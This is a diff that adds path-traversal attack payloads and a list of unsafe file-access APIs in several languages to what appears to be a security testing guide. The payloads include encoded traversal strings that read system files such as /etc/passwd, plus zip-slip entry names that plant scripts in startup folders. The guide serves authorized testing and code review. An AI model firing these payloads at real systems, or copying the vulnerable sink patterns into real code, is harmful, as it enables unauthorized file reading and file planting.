@@ -30,6 +30,120 @@ The unsafe assumption is that users only request files they own. This maps to [C
 | **Write/delete paths** | Upload overwrite, extract-all without per-entry validation (zip slip) |
 | **Indirect paths** | Database-stored filenames, object storage keys, cache keys resolved to filesystem paths |
 
+## Attack Payloads
+
+Use these in authorized tests when a parameter influences filesystem paths. Replace `FILE` with the expected filename parameter (e.g., `document.pdf`).
+
+### Pattern 1: Basic parent-directory traversal
+
+```text
+FILE=../../../etc/passwd
+FILE=....//....//etc/passwd
+FILE=..\\..\\..\\windows\\win.ini
+```
+
+### Pattern 2: URL-encoded and double-encoded sequences
+
+```text
+FILE=..%2f..%2f..%2fetc%2fpasswd
+FILE=..%252f..%252f..%252fetc%252fpasswd
+FILE=%2e%2e%2f%2e%2e%2fetc%2fpasswd
+```
+
+### Pattern 3: Absolute path bypass
+
+```text
+FILE=/etc/passwd
+FILE=C:\Windows\win.ini
+FILE=file:///etc/passwd
+```
+
+### Pattern 4: Null byte truncation (legacy)
+
+```text
+FILE=../../../etc/passwd%00.jpg
+FILE=secret.txt%00.png
+```
+
+### Pattern 5: Archive entry names (zip slip)
+
+```text
+../../../../tmp/evil.sh
+..\\..\\..\\AppData\\Roaming\\startup\\backdoor.bat
+```
+
+### Pattern 6: Unicode and normalization bypass
+
+```text
+FILE=..%c0%af..%c0%afetc/passwd
+FILE=....\/....\/etc/passwd
+FILE=..%ef%bc%8f..%ef%bc%8fetc/passwd
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Search for path concatenation without canonicalization and base-directory checks. Any API that opens files from user-influenced strings is a review priority.
+
+### Python
+
+```python
+open(f"/var/www/uploads/{filename}")
+send_file(os.path.join(BASE, user_file))
+Path(base_dir) / request.args.get("name")
+shutil.copy(user_path, dest)
+zipfile.extractall(user_upload)  # no per-entry validation
+```
+
+### Java
+
+```java
+new FileInputStream(baseDir + "/" + filename);
+Paths.get(uploadRoot, userSuppliedName);
+Files.readAllBytes(Paths.get(userPath));
+new File(base, URLDecoder.decode(name, "UTF-8"));
+```
+
+### C#
+
+```csharp
+var path = Path.Combine(baseDir, filename);
+File.ReadAllText(path);
+File.OpenRead(userSuppliedPath);
+context.Response.TransmitFile(base + "\\" + name);
+```
+
+### JavaScript (Node.js)
+
+```javascript
+fs.readFileSync(path.join(baseDir, req.query.file));
+res.sendFile(path.resolve(uploads, filename));
+fs.createReadStream(`/data/${req.params.name}`);
+```
+
+### Go
+
+```go
+http.ServeFile(w, r, filepath.Join(root, r.URL.Query().Get("f")))
+ioutil.ReadFile(base + "/" + filename)
+os.Open(filepath.Clean(userPath))  // Clean alone is insufficient
+```
+
+### Shell
+
+```bash
+cat "$UPLOAD_DIR/$filename"
+cp "$user_file" /var/www/
+unzip "$archive"  # extracts all paths without validation
+```
+
+### C
+
+```c
+snprintf(path, sizeof(path), "%s/%s", base, user_file);
+fopen(path, "r");
+open(full_path, O_RDONLY);
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
